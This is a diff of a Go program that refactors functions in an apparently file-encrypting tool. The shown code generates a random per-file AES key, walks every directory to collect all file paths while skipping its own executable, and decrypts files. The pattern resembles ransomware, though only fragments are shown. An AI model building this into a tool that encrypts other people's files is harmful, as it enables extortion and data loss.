@@ -10,14 +10,25 @@ import (
 	"path/filepath"
 )
 
+/*KeyGen function generates random 32 byte
+  key for each file that is encrypted */
+func KeyGen() *[]byte {
+	key := make([]byte, 32)
+	_, err := rand.Read(key)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return &key
+}
+
 /*Walker function is used to enumerate each file in each
   directory recurively. */
 func Walker(files *[]string) filepath.WalkFunc {
-	return func(path string, info os.FileInfo, err error) error {
+	return func(path string, f os.FileInfo, err error) error {
 		if err != nil {
 			fmt.Println(err)
 		}
-		if info.IsDir() {
+		if f.IsDir() {
 			return nil
 		}
 		exe, err := os.Executable()
@@ -30,17 +41,6 @@ func Walker(files *[]string) filepath.WalkFunc {
 		*files = append(*files, path)
 		return nil
 	}
-}
-
-/*KeyGen function generates random 32 byte
-  key for each file that is encrypted */
-func KeyGen() *[]byte {
-	key := make([]byte, 32)
-	_, err := rand.Read(key)
-	if err != nil {
-		fmt.Println(err)
-	}
-	return &key
 }
 
 /*Encrypt func encrypts files using our random key and file.
@@ -78,7 +78,7 @@ func Encrypt(cleartext []byte, key []byte) (*[]byte, error) {
 
 /*Decrypt function, parses nonce from cipher text and converts
   encrypted text back to plain text. */
-func Decrypt(cipherText []byte, key []byte) ([]byte, error) {
+func Decrypt(cipherText, key []byte) ([]byte, error) {
 	cipherBlock, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
